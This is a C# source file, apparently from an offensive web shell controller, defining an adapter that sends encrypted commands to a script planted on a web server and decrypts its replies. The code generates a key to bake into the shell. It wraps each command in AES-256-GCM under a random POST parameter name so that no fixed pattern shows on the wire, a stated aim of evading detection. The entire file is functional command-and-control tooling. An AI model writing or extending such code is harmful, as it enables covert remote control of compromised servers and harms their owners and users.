using System.Security.Cryptography;
using System.Text;

namespace Rod.Transport.WebShells;

/// <summary>
/// The sealed Rod family's shared half: the credential is a 256-bit key
/// generated here, the channel is AES-256-GCM in both directions, and one
/// request is one POST form value under a random parameter name --
/// base64(nonce ‖ ciphertext ‖ tag) -- with the whole response body in the
/// same shape. A language subclass supplies only its rendered script; the
/// wire is language-neutral, which is what makes the family composable
/// from language and encryption picks.
/// </summary>
public abstract class RodSealedAdapter : IWebShellProtocolAdapter
{
    protected const int KeyBytes = 32;
    private const int NonceBytes = 12;
    private const int TagBytes = 16;

    public abstract string Id { get; }
    public abstract string ScriptLanguage { get; }
    public abstract string RenderScript(string credential);

    /// <summary>
    /// How the rendered script spells its baked-key literal: the text
    /// before and after the base64 key (each language quotes its own way).
    /// </summary>
    protected abstract (string Prefix, string Suffix) KeyLiteral { get; }

    public string DefaultEncoder => "aes-256-gcm";
    public string DefaultDecoder => "aes-256-gcm";

    public string GenerateCredential()
        => Convert.ToBase64String(RandomNumberGenerator.GetBytes(KeyBytes));

    public bool IsValidCredential(string credential)
    {
        try
        {
            return Convert.FromBase64String(credential).Length == KeyBytes;
        }
        catch (FormatException)
        {
            return false;
        }
    }

    public string CredentialHint => "the base64 of a 256-bit key";

    public string? ReadCredentialFromScript(string script)
    {
        var (prefix, suffix) = KeyLiteral;
        var start = script.IndexOf(prefix, StringComparison.Ordinal);
        if (start < 0)
            return null;
        var from = start + prefix.Length;
        var end = script.IndexOf(suffix, from, StringComparison.Ordinal);
        return end < 0 ? null : script[from..end];
    }

    public WebShellRequest EncodeCommand(
        string url,
        string credential,
        string encoder,
        string decoder,
        string command)
    {
        if (encoder != DefaultEncoder)
            throw new NotSupportedException($"The {Id} adapter implements the {DefaultEncoder} encoder, not '{encoder}'.");
        if (decoder != DefaultDecoder)
            throw new NotSupportedException($"The {Id} adapter implements the {DefaultEncoder} decoder, not '{decoder}'.");
        var key = ParseKey(credential);

        var plain = Encoding.UTF8.GetBytes(command);
        var nonce = RandomNumberGenerator.GetBytes(NonceBytes);
        var ciphertext = new byte[plain.Length];
        var tag = new byte[TagBytes];
        using (var aes = new AesGcm(key, TagBytes))
            aes.Encrypt(nonce, plain, ciphertext, tag);

        // The parameter name is random per request; the placed script
        // reads the first POST value whatever it is called, so nothing
        // fixed rides on the wire.
        var parameter = WebShellAdapters.RandomToken(8, 14);
        var value = new byte[NonceBytes + ciphertext.Length + TagBytes];
        nonce.CopyTo(value.AsSpan(0, NonceBytes));
        ciphertext.CopyTo(value.AsSpan(NonceBytes, ciphertext.Length));
        tag.CopyTo(value.AsSpan(NonceBytes + ciphertext.Length, TagBytes));

        return new WebShellRequest(
            url,
            new Dictionary<string, string> { [parameter] = Convert.ToBase64String(value) },
            TagStart: "",
            TagEnd: "",
            credential);
    }

    public string? DecodeResponse(WebShellRequest request, string decoder, ReadOnlySpan<char> body)
    {
        if (decoder != DefaultDecoder)
            throw new NotSupportedException($"The {Id} adapter implements the {DefaultEncoder} decoder, not '{decoder}'.");
        var key = ParseKey(request.Credential);

        byte[] sealedBody;
        try
        {
            sealedBody = Convert.FromBase64String(body.Trim().ToString());
        }
        catch (FormatException)
        {
            // Not the base64 this protocol answers in -- an endpoint
            // speaking some other shape.
            return null;
        }
        if (sealedBody.Length < NonceBytes + TagBytes)
            return null;

        var nonce = sealedBody.AsSpan(0, NonceBytes);
        var ciphertext = sealedBody.AsSpan(NonceBytes, sealedBody.Length - NonceBytes - TagBytes);
        var tag = sealedBody.AsSpan(NonceBytes + ciphertext.Length, TagBytes);
        var plain = new byte[ciphertext.Length];
        try
        {
            using var aes = new AesGcm(key, TagBytes);
            aes.Decrypt(nonce, ciphertext, tag, plain);
        }
        catch (CryptographicException)
        {
            // A tampered body or a wrong key: the protocol's own refusal,
            // the same null a marker-less answer gets.
            return null;
        }
        return Encoding.UTF8.GetString(plain);
    }

    private static byte[] ParseKey(string credential)
    {
        byte[] key;
        try
        {
            key = Convert.FromBase64String(credential);
        }
        catch (FormatException)
        {
            throw new NotSupportedException(
                "The sealed Rod credential is the base64 of a 256-bit key.");
        }
        if (key.Length != KeyBytes)
            throw new NotSupportedException(
                $"The sealed Rod credential is the base64 of a 256-bit key, not {key.Length * 8} bits.");
        return key;
    }
}
